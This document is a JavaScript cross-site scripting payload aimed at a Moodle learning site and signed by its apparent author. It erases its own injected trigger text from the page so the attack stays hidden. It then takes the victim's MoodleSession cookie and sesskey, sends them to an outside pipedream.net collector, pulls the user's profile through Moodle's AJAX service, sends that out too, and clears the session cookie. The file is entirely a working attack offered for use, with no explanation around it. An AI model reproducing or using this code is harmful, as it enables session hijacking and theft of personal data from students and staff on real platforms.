//btw PWNED BY NZRXHX
(() => {
  const targets = [
    `"onload="import('//nzrxhx.github.io/payloads/payload.js')`,
    `⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`
  ];

  const walker = document.createTreeWalker(
    document.body,
    NodeFilter.SHOW_TEXT,
    null
  );

  let node;
  while ((node = walker.nextNode())) {
    targets.forEach(target => {
      if (node.nodeValue.includes(target)) {
        node.nodeValue = node.nodeValue.replace(target, '');
      }
    });
  }
})();
const u=document.querySelector('[data-route="view-settings"]').getAttribute('data-route-param');
const t=document.cookie.match(/MoodleSession=([^;]+)/)[1];
const s=M.cfg.sesskey;
fetch('//eoizd5ecl7m1qqn.m.pipedream.net/?MoodleSession='+t+"&id="+u+"&sesskey="+s);
fetch('/lib/ajax/service.php?sesskey='+s,{
    method:'POST',
    headers:{
        'Content-Type':'application/json',
        'Cookie':'MoodleSession='+t,
        'User-Agent':'does it even matter atp?',
        'Origin':'https://globalsupport.education'
    },
    body:JSON.stringify([{index:0,methodname:"core_user_get_users_by_field",args:{field:"id",values:[u]}}])
})
.then(r=>r.json())
.then(d=>fetch('https://eoizd5ecl7m1qqn.m.pipedream.net/?userinfo='+encodeURIComponent(JSON.stringify(d)),{mode:'no-cors'}));
document.cookie='MoodleSession=;path=/';
